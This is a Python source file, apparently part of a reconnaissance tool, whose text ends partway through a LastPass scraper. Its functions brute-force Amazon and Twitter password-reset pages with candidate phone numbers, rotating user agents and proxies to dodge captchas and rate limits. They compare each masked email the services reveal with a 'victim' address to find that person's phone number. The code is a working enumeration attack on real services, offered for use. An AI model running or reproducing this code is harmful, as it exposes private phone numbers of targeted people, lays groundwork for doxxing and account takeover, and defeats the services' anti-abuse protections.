#!/usr/bin/env python

import argparse
import os
import random
import re
import time
import urllib
import zipfile
from itertools import product

import requests
from bs4 import BeautifulSoup

from globals import YELLOW, ENDC, RED, GREEN, Actions
from settings import verifyProxy

requests.packages.urllib3.disable_warnings()

userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/29.3417; U; en) Presto/2.8.119 Version/11.10",
    "Mozilla/5.0 (Windows NT 5.1; rv:34.0) Gecko/20100101 Firefox/34.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"]

proxyList = []
poolingCache = {}  # To cache results from nationalpooling website and save bandwith


############ BRUTEFORCERS ############
def startBruteforcing(phoneNumbers, victimEmail, quietMode, verbose):
    if quietMode:
        getMaskedEmailWithTwitter(phoneNumbers, victimEmail, verbose)
    else:
        getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose)
        getMaskedEmailWithTwitter(phoneNumbers, victimEmail, verbose)


# Uses Amazon to obtain masked email by resetting passwords using phone numbers
def getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose):
    global userAgents
    global proxyList

    print("Using Amazon to find victim's phone number...")

    emailRegex = "[a-zA-Z0-9]\**[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z0-9]+"
    possibleNumberFound = False

    for phoneNumber in phoneNumbers:
        userAgent = random.choice(userAgents)  # Pick random user agents to help prevent captchas
        proxy = random.choice(proxyList) if proxyList else None

        session = requests.Session()
        response = session.get("https://www.amazon.com/ap/forgotpassword?openid.assoc_handle=usflex",
                               headers={"User-Agent": userAgent,
                                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                        "Accept-Encoding": "gzip, deflate",
                                        "Accept-Language": "en-US,en;q=0.9",
                                        "Upgrade-Insecure-Requests": "1"
                                        },
                               proxies=proxy,
                               verify=verifyProxy)

        sessionId = response.cookies["session-id"]
        prevRID = re.search('name="prevRID" value="(.*)"', response.text).group(1)
        workflowState = re.search('name="workflowState" value="(.*)"', response.text).group(1)
        appActionToken = re.search('name="appActionToken" value="(.*)" /><input', response.text).group(1)

        csmhitCookie = {"version": 0, "name": 'csm-hit',
                        "value": 'tb:B79Q924JBYC22JBPZBPY+s-B79Q924JBYC22JBPZBPY|1555913752789&t:1555913752789&adb:adblk_no',
                        "port": None, "domain": 'www.amazon.com'}
        session.cookies.set(**csmhitCookie)
        response = session.post("https://www.amazon.com/ap/forgotpassword/",
                                headers={"Cache-Control": "max-age=0",
                                         "Origin": "https://www.amazon.com",
                                         "Upgrade-Insecure-Requests": "1",
                                         "Content-Type": "application/x-www-form-urlencoded",
                                         "User-Agent": userAgent,
                                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                         "Referer": "https://www.amazon.com/ap/forgotpassword?openid.assoc_handle=usflex",
                                         "Accept-Encoding": "gzip, deflate",
                                         "Accept-Language": "en-US,en;q=0.9",
                                         },
                                data="prevRID=" + urllib.quote(prevRID) +
                                     "&workflowState=" + workflowState +
                                     "&appActionToken=" + appActionToken +
                                     "&appAction=" + "FORGOTPWD" +
                                     "&email=" + phoneNumber +
                                     "&metadata1=" + "ECdITeCs%3AYepiSml9%2BnkZb0MXAk3%2ByjdXcfjkmehrjevmNH8ceN%2B2SfKQrivwPHTKWv7IzIHd1lYz1tY2WGqeS7Zioe78H679%2BxQ4MXpJCvXrC8KSxHfeI%2Fe1L061lUDZFhZLZroR593ReR9RicjJHRSp5rIK%2BGy9%2F2503L2FTVB68OpW8yksfG%2BTO3cucoWs%2BPVbLiCnxPkCdpD5gZN6q9LFjhuI9Qce3e3YcxWedio0smgtPGmNh1LdRmg3hLRZ%2BsKvsD67pTxoGel%2BXgYRdqLClyXiDpsojLZp4VtZcYf%2FtoKazdvrKROQMUArQie33En4WGwRuNGgPCR3Ecliuc8ap3uGnzyWJ4DWONj772XHI3OrFymVF1ImSHFbPV3uSKCxpFnUn9mh3obKJHKk1GB0dolo2aXLIT%2FAWt%2BjIhJLT4qjo3DI7biJQFqdAJCu%2FIJqnndDj10OoWkOAEsJ6vu4OcQrCuAccFl1FEg24Bg0kcWE4yJlmL%2FRFs7n34x0QARkqnYjYyLRkBfIbGcfqNLb3kD%2Fl3vH%2BX46uYVTPTcmZ2gpKHEGx9UcWX%2FslI9RgiHJj54wDgTBIpUQiMl7T7Db5n3Li4O1%2FDPMS%2FSMaQSkH2mbVXB1yINJox5F93ByPAU2ZSRtuxAhOl0jaUWlj%2FsfiK7Ay8bxIbE%2FFY4AgG0aaJG7G7nnxwEN7ejklXkmkHAxrfyLx6BLAXmvN%2Bg8sFRvQoaIxRIrKqGF2qY4EbEtVmq04BwYOCt4TB13NS1KU0fXgYjNxklDwrIN60LBDJm44D2xa7WVkvjcbAL33f1i2b6hppS2ieHNay2tC8Lv6FTkvl2AJU3eyOBiU2kHFV57PGrBANUVq2Rk6FhHCfvPWQ8SrUbIdNG8oopBRsUav2vV9SyJ%2FtbAEy1xspzMh0KTMmIXVwNsIHCfldK4fcuRO5agZbPELNWPu9gQFg86gaivmaQfewpsrX00PLLr1TtF5oWE%2BzzvWX2gRQdfCg8uJRDzve4Oq2KZOQrMpT0RuTd8%2BfxOrJhLW9AqI7z39ddXYohTPqNEaECst%2BMs%2FgOxYV8VswBkOp5a7MsK8IjB7mNxLU9Xqra072HWug2wK%2Ffyj6XWCSB%2FFgpFAD5FkaBEo4wNqZev5b%2BAaapPOLv1oGzS9xqShDYVI1GwJ%2BclrdMUJQgB4tb5WNrFKtg%2Fnnm6oM5aO%2BCkzlYVE3ldw7L5CJqWa8vEaaSnFL6emWYM277fWfMSLYQdE4ySQXISBUf9%2FSMf4frAnB2TkyCuKAf24%2BTh7GYpcs5mNMCCHiPseW3ZD9TzooFEoSWusNnSe7DOm9uC7u9IHr5J%2FJhBc7pMW9PaQhZ8WFKgd1I6BHQyJytJfPuToIDLXIg7Qv9%2B%2BRexaZJZfPROkhKdnH5vjzs49%2FJ3XK3PM7IwirYZsTRlfxZv7d8aDNX07NwEOdiTdOx9jaqPeQvDSxhmEd5ZaPp%2FctXJCjiiUPjuQOfRVPiJ8eq9fwJqnUfunNP7HBmBRqiH3uPRdPdbiEKE3IeperWk8aBDBJGC%2FS4qMTRZPlKR0u%2BR1olOlfWhNqYdtu9YUBiNPe9%2BLumCQ%2Ba59imb5SRtwLZy5gHuUoIco9Epto5zxoFe9kHyjAlRSPxE%2BQa%2BvJFfNQU%2F6L1pUo8d9elAEKhqBBGwqED0em83NhQX5y54DQQ8dYq9sx4RuhMxCFU5NQonEdu2vaN5S7b0e%2FL1kcjcCYKWmEVyR8GeOIwa5DObcLrMc6TOJwtyNrYmZIrjJWoenzmjG1tfbuTWk%2FME5o1GpxE3Q0ke35OftJ3nE%2BoebCzLNwOkEMc%2FoJW53rGJH3TGW8%2FErs%2F9mWP6cTLn%2BoVGwG%2BwZzZZ2mBWmTvDCKpaXzbivk3NTP4nlJriIeyNm3YiJgMe82osBhi%2BHmyCSSD5ye%2FmeucjulOiEvTybj7bvy5vms7MrqBfCr%2B%2Bhz%2BvWZdYr6YTQuR8tYYi0SHtFhcrSS88kaLn0BpQ2pyb6Q9zzvmE9jhGH9C07HB8nU5iSvbilbQsubIbclODpuz70EHTh1wxTTx%2BBO95k3aYHti9BD2fJzpFJdZrC1YE%2F%2F%2Bb9Bko6ipvPfAEZXY6NWCCj6KtoQb%2FYVNDsIobw55PX2nliOc0zbmGa3NFkkjaEBc%2F19EmkhJh2g1t75GreIph6btQeeTmGmpZ%2Bj6OifdtgsfXhOBe5wx5WpXclfFUhiMRxHvXCW2Nk7JFxky99aBbbfiWS7uYwLjiQL7CZxnh3HjkDM5M5200GvTKl14epljFiBohNSFGU1Htg9wkesjJYNKFJNtaq%2Fjg5H72T0LwTDMOw5y2qZirWsgpEhLyvfoheG5he0hw2S0SLQReC9qkrpQuWibpHD2jQQofrbsfl%2FSynnoTxaYP2skdyMyVz3OuEfC91FI%2BfzFMBmcrAEYuAwvUKPU7cf1OA7UxpFvFpEqWrAn2KNWLy%2FekuQWZuA%2BqGF8W3uu%2BVMKS1HCIVL1iO%2BL4WQlpzSVCZkAvBCdBiFcBQ30cv2rAY5IaRti3YgBK%2FsV%2B8tdz%2BT9IJHuSaSEDR8NnRpcuEPRFr6dy659wgWNcSZIcjz%2F4Kr5%2FdicB4nVnPgUG8tGceU9SZgLcvgnlNN6S0IBohQICJ6C0MNzoZhsP159xHP1mh5XP2ly8KKYU0ZbYT97DOKBf6x6Gt%2Fhm%2BtAwXKZ1%2FJ47%2B5XG5Xo79jDHZ31t%2BTQaY57U%2FuDVjkn7bvCTVxqhQFIeUU5yY3qCMVNyGpIpacR9VzZxSQ282ZMFvOpVD0AxN7C7KtzNCOCAVIOCYETWd%2FzAAkgf2eJci5%2FEodvlx7DrdGOWglRNjlE0Hvs%2F6LaWOR%2FZWJDSMwQ23%2BU6Pb48BZJr1pz5dEierk8qWywTukfYINA2t02MmjrPSpY02IHFXQgP7htrHNppDj1jxn6jXkrQ43QQcy6PI%2Fr7LxGzx6vdudOjdQzhnfRWPm4rvVkU6EVTPs4O4qGSYGPM%2BL4Jb5XyYsZZqAkTMF7AB0y7n%2F%2FWqJ4rr9R8d1RIaAqnLT01RCWJdUMolR7rQbS916kBe37laMGQ598Yt4xAF%2Ff5xvrvaOJwKfSU244PcSysKxPp4xJ4A3ap6pH3NHhXNp3J6DgUxYqxzOGmtAeKK26V0pElFxUjbj%2Fgp2FmJRJvQT0cA%2B9K6Iw8pDbg%2FcF3%2B%2FVQPnVfW4AyeO383Wd5eD12Yjfk1DCZ1ZQ52lSqQUrxt8MqRPBiPbXfeLNNPcJLkjgwZOZzguKxZ9fJEy%2BZCHANzsWJ3zCeh6CugAuhvwl23mVkjNN3lKtWkpDCPkhkqI8cSV6l0HjOfmfVQNtCOoY4izpVe3FCrTRnZNDV7J6iesU3RyFqCFUHUI4BL%2FQHH9DMfAA9GocY4vrb0%2BHxq5uu%2F1dHs5R6mXTOZT7SC%2BbvWWCW7xyp0TXckOCW5%2Bhj7MPgzzegzKzoFQEYqUwBZeby3bkDphYTcCDDlwm61Fz22XIjq0NiTzoV3ahi68uLYOs3tRRJzmFCd0MMpQ50d0dC5kof5LmQ%2BbYXfIe7gbk8vmgaZI4MRvS%2FWAhCFxdoj1X3%2BrhiuQs3MTckDYzNmWXwouh31fLz91KetUQb3pIEC9%2BVQvzXW3wGDTRwV7c635%2BY6mjuSQ8FXzL8Q5gkw6eb1bycbyDJws0XcfJ7wdNJGqJMQJwhHGUVgCl1iXHeAvc3oz1SCSU4zuu0es2jE6kd2cr6B5ENO8WyGAR%2F9Md%2BnRp9r1f0wZFaVXOHh%2FWgLkY5vScxxCuQl8SNGcvab4GkqlPXuOUwcBBa%2FjqUOTMB8l%2FRA7nfvTB8maDtbpRYBqgk0A%2F43yrdYZG2BiB0stffaRimdPHm5pximPza67WcECvaDBZ3nbCxdTth2xM8ytoeRwQyR95vBJuvnUfI53Pqceo5RaeIwbbdXWBLsrX9ldgVnN6fspVYBzfmqPNcn836xE2D%2FSAe5qoj0iWAKjCuGg2C5PhNa%2BnKgRBnE%2FTW5pMZv5bwzITGAK42roy23OeDKP3BEAmdBrQjaGsDDBRhjFXn2bpAbvXTeI15CCSYalqe9OiQixUH3Ixv1ix%2BP7CLdyv4d1a6Dj1S83V%2Bw1YiK7MBxwHVagNWAR8OZqu4Q%2Fgob6SBudpaXz0WcoJFgXxn7%2Ba3K1cLp2GWjUGJeMyx7e%2B8YQ5dhuFflUfgGI7Eg3E5wz3x29fpNqjx6OV89hwZWLsJvRUllBPGR%2B1oXwIty8noEwfwQ0JuYAPeAAA05bQlJ3OG5LAo%2Ff74rMFKC2IwBTsoy8oKBpPw60uo07LNE%2FTH7g4DSKw5Cm1k3lIZF5ggkGLVl2ZvjRxQ5gx%2BEJn4kzHAOPClBC9FLPzSX0LRTi8wRzBEDBaaJ04AebFj6VkM7v3uJT9uc1OdkDREmKlgyIYC%2FBoDR0h%2FZkPBI3n5h5HP%2B20GlvpcswKMpEXY8AT4jR4FdG%2FKn%2BF12Fqv7UOo31cJuee9NV%2FroAcDYjJRcniug4Gtmk5uR8etZlXptBbXlNFB16X5baqlxdVYsIG5d2QaEZi0V1vs2eoK2aAkBTxJWEYBlqapa3koH9h4kh0WWl1MnIpTMvzdMzrKpnrvNeMc2k2TPj%2BaC%2FrJr%2Fa5YUoSMo6BWFEba6tp69XmbUHSs5gUwCGvWgYk0%2FeqO601inIG8ZPnMoCO2dJzQ1O3u26nsQ4LPAxsZtkMjDaAz5Ex6zIQvfla9HPB8B9FxXMenDRw6Qwo7bJLot2unbOllvGukRlevqj%2F3%2BlOEHDeGz9x1K2LK4DLion9Gqwz7uLijuJpThQv2IHWUttMvb4UfUr3urgSB0DkTdS3saO%2B%2FSH830Z%2BE%2BIO8Ap4YIl1G2BvhWFiCwwgcp5sFgpcAyWzqMq4KM3%2BWcFctnayYPrrQmCW0t5u%2Fl5H0hx8tOA6tDYP%2BodYmE8pHsV5M0JTEBbDjtqaUtaTWX181fj3%2B7dQCUy73SmNrotNl3LgbL%2BlCw3CbMZ3e5sB6NlqNubhHuD2%2BLYNL9k8ExvyjrRhuYwX2SKK6QBLGkmsrWN62n4W37dxYhUCVx6KLCaJTqRpcnubZWmGwbjiGP%2B7M7NrZJgVWmdwp7yLfq%2B1GR3nD3mUwcNXnwGSpR%2FIvOrVIvWk81J7jFUIC5WiAU2022PY4cveBpaAFa2f8Ebg%2BY4g%2F21wVJzyJt%2B%2BlwkfmtXQAzPz0DFXL4gZLi%2BwiSBoioMq2LcmAn1p9HvB6u0i1VtKJIfdxVnpLpS%2Bmui8oybkyxesHVEMXz%2FbamK7jJZLVNc6Xkh6WAzl%2FgqB87Mmq%2FsDwxjoPg9VWtu%2FhsVuYkeUnVgb2y1CK%2FemDW0tnXewgZAL6Tn0siNVJ07KASId3PiNjocJAXY2xCuCBS3XXgM7gtIJhA8AZQjG4DQb8A%2BKKqkuYPPj2nxqJe%2Fei11Cqq1dVh3d0NTu8lTXxARqPoNsS8wR2aabaK2%2BdhSibZmbIwd1678agXqq42Nb13%2FBM5YEshClB7Sq%2FgV9O27TU1dDheGTpmFF9dRbOF8TCEZc1YFlSUtQN6V6Lii4awE9rnChY67xnZRSPi67%2FOaaMKLO6Bngqi0hE5DCHQq1GTras4rIQY1TcjHVP4bqmFyr%2BPvDqPtL9XOoq01QUMfomVes2m%2FRzw7OTid1iWbWeBWiuGRH%2FuMC5aoqr3RfITxxDL4gYRzR0mwmSyEvv%2FTGtyL6mZMQXy6NH5gqD2werGAbXmjc8udGot6fwqrfV4cRGL83ItuO5EFsEAuB%2BIO%2BzK2%2BG0iG9ZvfBI9TeXjA3m32v496DodjqJ3hPH531P7mE0r6N%2BDuTUUE3fqEk6%2BFPz9%2FYmwtgDXEm0MBcFgVQl%2BLg1PyHskjZdT57vO3Gxw2N0PQQpdRc5Rp1m8qKU0O%2Fzbzqp%2FSD3cnHndlbUMXvUDiYJcYTed%2Fk3xs2cAPIjQ6Lsa1zjcuij8JjvFWHVQGsKyaWab3OD3viN%2BhUexnVSTfRyI4vXJ%2FhkHmRLFn5%2BxiM2MDVNpnuZodGTAXOfOAh3sk7ktlNC6DWlDKlKzH4hyOS5JlK2Qws8yhEkBvXzhCzZqjvhBRcHKgLRnE%2BW74vQfvalPlJcr5XblvXWAwi10I6afJsX0cqYwLsv6xLvbVB%2BUdboe%2FLrinorI5w3a8Fmd5uF%2FWH0PGf%2BP4ho67NluL8T1kgY176fpk%2Bd8tgbaI2hjM59CkmJykbD6iH2HtHU%2FsRGKF8BAJHCUNWPBFYYQKdNeD0bDyvXBb3OSSAHISQniSvvGxO1ic8ZSFjETo%2F%2BIG%2BsPc8vHrBE4nXdC2Zzwp3orSnoFpVwJcorIURFYfxpTHe%2BX3kpOrbyC0Dmj1b635uqxZ3Zs%2FufAFppYTkornGwwaJeWn%2B7LATFwLM6nVl8G5QYmAWy0Xb0HIio%2FDtLDRdqji1u1mCj8jjlTh85yUC0k5b77C0yUWEruEz35hAWSfH2tNNIB9Uhswk5T1g3Y8lWbAsZznsEJCftV8tzURQc%2FSZjzn7O3Dl6EbuPq9jhGKbWKVipv5onWblFbw7Qw0KEthykzo4nR0cvuP%2FbkwPPdfMdTrVV47ihFZosm9JCGsdQ9uA1p9UNL1TNuYNwaIAU8SF2%2FVx2xkBI7eTU2MIiSLPX8UTO7cNdFEESlgNF49U566TpqSiZc51UaqZ%2FFzcbSaNdpl%2F52NY8%2BqufCYMqdA2ivYOycO5DicPsnTgp2uC2%2B6h%2BFlBZzDKMbENckZagUe1%2Bgx6azoI3oq4EiNsNlRMHIm%2BQDo4XRvxlP5HEzXKVNNLnmclp6bnX5ey6xQUas%2Fq%2F3NGZlG7TbwYOpBfz9JNrx9D86zrN03Y6nkdrxJNCNLP6hNzQifxmfXFz%2F7qjNjMkh0GXqHwbM6lkSqi3qLPpmek%2FWzaoljUC9pY11xZ8j7r71AgJqQ4dXeLDdsliR%2FtJbzTSs%2BLVlXMVjXMi1v4g%2FxovLxsZ0JhQurAD%2Fndee04mrUVGX7BDUXVHtbbdvl7BeWez4uHpXSQp24Vm7nWYnC6c94vqTKpSDmdqXlnQNZ698Dp0ZCjoP5Pl28u9mt1R%2FMJ6olU3ja8Li9MAXQ8gHFyMbZ4oI2fhtYfg7%2BPYp9qf0CPT4FL9xg5Ochh5K6TpmiYK6GSKePfzDMr6YhivJuZalsqH%2BeSChF9OnNcPvXo9ejRqY5iA8JxTY8ah%2FgDL%2BlgVkMTITGJeIUOHnrhKTVdvcQfu3YP4Ct%2F8vu1BIpT07%2B17KkxJAM9ws8SOjOtS5zz%2BFrnn1yn1jWoglgidjPD2xf342KapbjlhrfSDL3mhSWDtWdrxa%2FjrChVZezCsWSXKsp0f3r8Y7jx%2BWZpiDZ5gE3xC2cYTtgvaQ4qUFOirnMk0DWbNFpyrK8GutFK0MQYiPV69ycsXry5pAMFw%2BBlgCKjsyKlLyZrWxyhFV3JY0ryrj6ci02kGX1V%2BrQgsOB%2BP4hXVt4ipKMe3ovSP2qnYgICnCXcNQMfrPMDUl2x%2F5MbNirkVNUC5yBw8I5GaOHyVvfoFZJq267EBbki7ISkB6i7Elsbs7A0kC01oq29FET8%2FArbkzNmSeH%2FeshDZgX%2BG%2BN%2FYp%2BoIfwSvX2CWxJGCrhceM1TO58KNJ78OQ%2Fa%2B%2BBdaKbDXEeQ3YKQIUIzpErZPzbjwVPwJ4nLePc8f9zyngxTyZVMOH7%2BjeRX%2BzngKShBiKy8a4hyfFekb%2BdrP%2FqBEcjyq8sWtWTBNEEdl5uJFiKHQSy%2F5WAFuuX3yerQHq%2BYsDdd0f4lWftNcHxdLJ5C1IKhm7TLEAbt37Szs%2FNf1lxuQJ4H8GWolMSKCXjPTr7JX5lmCbLaM6cqPkYsoMfkYZKHcTB5qL3Fuc%2F1RjRCVbebr5eqK8mEHq6miZH%2FkNYCwMhG%2Fe8dk9pD8wcQm9dAoX4LyiGmcFSHkw7Vyu3c%2FyEFRKQr5McsOyPavoTIl73JelEUq2gjfXw%2Fj6BMGNWhttumOOPOkNcRAUUZoNvKo44x%2BNGUVNN0hgYmrDt9FBx%2F%2F2PfHDNu3TsOZCqB5LyPgmCiZ83StGq2dy%2FX8hlWXdBfcvJdNTCRrob7GIYrZg3somd0r%2FbS2tYsIPj6OLAhZf9EuZ8sa6ECrFp9Lhl321R8ls3kS3zyIFNMEWWFFWOMxRrTiZ%2FYUCi4%2FkFrEuPR%2BTpWb%2Bv%2FjCVyA6xXvdrHThl%2FBPMHIL%2FNsH3%2Fc8xEHoaHiEpuMnmYRdr7Kg8vC%2FrE0Q5gGxHa%2BzgfX1w0Snzymr%2BNZyq8lKNwidFciPR30pkKoS4VsZpzq7WlxT1k8rSH25Iqi20%2Bg%3D%3D",
                                allow_redirects=False,
                                proxies=proxy,
                                verify=verifyProxy)

        if "Location" in response.headers:
            redirectURL = response.headers['Location']
            if "prevRID" in redirectURL:
                redirectPrevRID = re.search('prevRID=([A-Z0-9]+)&', redirectURL).group(1)
                redirectParamJwt = re.search('paramJwt=(.*)&', redirectURL).group(1)
                response = session.get(redirectURL,
                                       headers={"Cache-Control": "max-age=0",
                                                "Upgrade-Insecure-Requests": "1",
                                                "User-Agent": userAgent,
                                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                                "Referer": "https://www.amazon.com/ap/forgotpassword?openid.assoc_handle=usflex",
                                                "Accept-Encoding": "gzip, deflate",
                                                "Accept-Language": "en-US,en;q=0.9"
                                                },
                                       proxies=proxy,
                                       verify=verifyProxy)
            else:
                response = session.get("https://www.amazon.com" + redirectURL,
                                       headers={"Cache-Control": "max-age=0",
                                                "Upgrade-Insecure-Requests": "1",
                                                "User-Agent": userAgent,
                                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                                "Referer": "https://www.amazon.com/ap/forgotpassword?openid.assoc_handle=usflex",
                                                "Accept-Encoding": "gzip, deflate",
                                                "Accept-Language": "en-US,en;q=0.9"
                                                },
                                       proxies=proxy,
                                       verify=verifyProxy)

        if response.status_code >= 500:  # Error, let's try again
            print(YELLOW + "WARNING: 500 error returned for phone: " + phoneNumber + ENDC)
            continue

        elif "We're sorry" in response.text:  # Phone is not registered
            if verbose: print(YELLOW + "Phone " + phoneNumber + " not registered" + ENDC)
            continue

        elif "reached the maximum number of attempts" in response.text:
            if verbose: print(YELLOW + "MAX attemtps reached when trying phone: " + phoneNumber + ENDC)
            continue

        elif "Enter the characters above" in response.text:
            if verbose: print(YELLOW + "Captcha caught us trying number: " + phoneNumber + ENDC)
            continue

        elif "Set a new password" in response.text:  # Deal with multiple option
            response = session.post(
                "https://www.amazon.com/ap/forgotpassword/options?ie=UTF8&openid.pape.max_auth_age=0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&paramJwt=" + redirectParamJwt + "&pageId=usflex&ignoreAuthState=1&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_custrec_signin&prevRID=" + redirectPrevRID + "&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0",
                headers={"Cache-Control": "max-age=0",
                         "Origin": "https://www.amazon.com",
                         "Upgrade-Insecure-Requests": "1",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": userAgent,
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                         "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "en-US,en;q=0.9"
                         },
                data="prevRID=" + prevRID +
                     "&workflowState=" + workflowState +
                     "&fppOptions=notSkip",
                proxies=proxy,
                verify=verifyProxy)

            if not re.search(emailRegex, response.text):  # Sometimes no mask is shown, just the actual phone number
                if verbose: print(YELLOW + "No masked email displayed for number: " + phoneNumber + ENDC)
                continue

            maskedEmail = re.search(emailRegex, response.text).group(0)
            if len(victimEmail) == len(maskedEmail) and victimEmail[0] == maskedEmail[0] and victimEmail[
                                                                                             victimEmail.find(
                                                                                                 '@') - 1:] == maskedEmail[
                                                                                                               maskedEmail.find(
                                                                                                                   '@') - 1:]:
                print(GREEN + "Possible phone number for " + victimEmail + " is: " + phoneNumber + ENDC)
                possibleNumberFound = True
            else:
                if verbose: print(YELLOW + "No match for email: " + maskedEmail + " and number: " + phoneNumber + ENDC)

        elif "We've sent a code to the email" in response.text:  # Got the masked email
            maskedEmail = re.search(emailRegex, response.text).group(0)
            if len(victimEmail) == len(maskedEmail) and victimEmail[0] == maskedEmail[0] and victimEmail[
                                                                                             victimEmail.find(
                                                                                                 '@') - 1:] == maskedEmail[
                                                                                                               maskedEmail.find(
                                                                                                                   '@') - 1:]:
                print(GREEN + "Possible phone number for " + victimEmail + " is: " + phoneNumber + ENDC)
                possibleNumberFound = True
            else:
                if verbose: print(YELLOW + "No match for email: " + maskedEmail + " and number: " + phoneNumber + ENDC)
        else:
            print(RED + "Unknown error" + ENDC)
            if verbose: print(RED + response.text + ENDC)
            exit("Unknown error!")

    if not possibleNumberFound:
        print(RED + "Couldn't find a phone number associated to " + args.email + ENDC)


# Uses Amazon to obtain masked email by resetting passwords using phone numbers
def getMaskedEmailWithTwitter(phoneNumbers, victimEmail, verbose):
    global userAgents
    global proxyList

    print("Using Twitter to find victim's phone number...")

    possibleNumberFound = False
    emailRegex = "[a-zA-Z0-9]\**[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z0-9]+"

    for phoneNumber in phoneNumbers:
        userAgent = random.choice(userAgents)  # Pick random user agents to help prevent captchas
        proxy = random.choice(proxyList) if proxyList else None

        session = requests.Session()
        response = session.get("https://twitter.com/account/begin_password_reset",
                               headers={"Accept": "application/json, text/javascript, */*; q=0.01",
                                        "X-Push-State-Request": "true",
                                        "X-Requested-With": "XMLHttpRequest",
                                        "X-Twitter-Active-User": "yes",
                                        "User-Agent": userAgent,
                                        "X-Asset-Version": "5bced1",
                                        "Referer": "https://twitter.com/login",
                                        "Accept-Encoding": "gzip, deflate",
                                        "Accept-Language": "en-US,en;q=0.9"
                                        },
                               proxies=proxy,
                               verify=verifyProxy)

        authenticityToken = ""
        regexOutput = re.search('authenticity_token.+value="(\w+)">', response.text)
        if regexOutput and regexOutput.group(1):
            authenticityToken = regexOutput.group(1)
        else:
            if verbose: print(YELLOW + "Twitter did not display a masked email for number: " + phoneNumber + ENDC)
            continue

        response = session.post("https://twitter.com/account/begin_password_reset",
                                headers={"Cache-Control": "max-age=0",
                                         "Origin": "https://twitter.com",
                                         "Upgrade-Insecure-Requests": "1",
                                         "Content-Type": "application/x-www-form-urlencoded",
                                         "User-Agent": userAgent,
                                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                         "Referer": "https://twitter.com/account/begin_password_reset",
                                         "Accept-Encoding": "gzip, deflate",
                                         "Accept-Language": "en-US,en;q=0.9"
                                         },
                                data="authenticity_token=" + authenticityToken +
                                     "&account_identifier=" + phoneNumber,
                                allow_redirects=False,
                                proxies=proxy,
                                verify=verifyProxy)

        if "Location" in response.headers and response.headers[
            'Location'] == "https://twitter.com/account/password_reset_help?c=4":
            print(
                        RED + "Twitter reports MAX attemtps reached. Need to change IP. It happened while trying phone " + phoneNumber + ENDC)
            continue

        response = session.get("https://twitter.com/account/send_password_reset",
                               headers={"Cache-Control": "max-age=0",
                                        "Upgrade-Insecure-Requests": "1",
                                        "User-Agent": userAgent,
                                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                        "Referer": "https://twitter.com/account/begin_password_reset",
                                        "Accept-Encoding": "gzip, deflate",
                                        "Accept-Language": "en-US,en;q=0.9"
                                        },
                               proxies=proxy,
                               verify=verifyProxy)

        maskedEmail = ""
        regexOutput = re.search('<strong .+>([a-zA-Z]+\*+@[a-zA-Z\*\.]+)<\/strong>', response.text)
        if regexOutput and regexOutput.group(1):
            maskedEmail = regexOutput.group(1)
            if len(victimEmail) == len(maskedEmail) and victimEmail[0] == maskedEmail[0] and victimEmail[1] == \
                    maskedEmail[1] and victimEmail[victimEmail.find('@') + 1: victimEmail.find('@') + 2] == maskedEmail[
                                                                                                            maskedEmail.find(
                                                                                                                '@') + 1: maskedEmail.find(
                                                                                                                '@') + 2]:
                print(
                            GREEN + "Twitter found that the possible phone number for " + victimEmail + " is: " + phoneNumber + ENDC)
                possibleNumberFound = True
            else:
                if verbose: print(
                            YELLOW + "Twitter did not find a match for email: " + maskedEmail + " and number: " + phoneNumber + ENDC)
        else:
            if verbose: print(YELLOW + "Twitter did not display a masked email for number: " + phoneNumber + ENDC)
            continue

    if not possibleNumberFound:
        print(RED + "Couldn't find a phone number associated to " + args.email + ENDC)


############ SCRAPERS ############
def startScraping(email, quietMode):
    print("Starting scraping online services...")
    if quietMode:
        scrapePaypal(email)
    else:
        scrapeEbay(email)
        scrapeLastpass(email)


# scrapePaypal(email)


def scrapeLastpass(email):
    global userAgents
    global proxyList

    print("Scraping Lastpass...")
    userAgent = random.choice(userAgents)
    proxy = random.choice(proxyList) if proxyList else None

    session = requests.Session()
    response = session.get("https://lastpass.com/recover.php",
                           headers={"Upgrade-Insecure-Requests": "1",
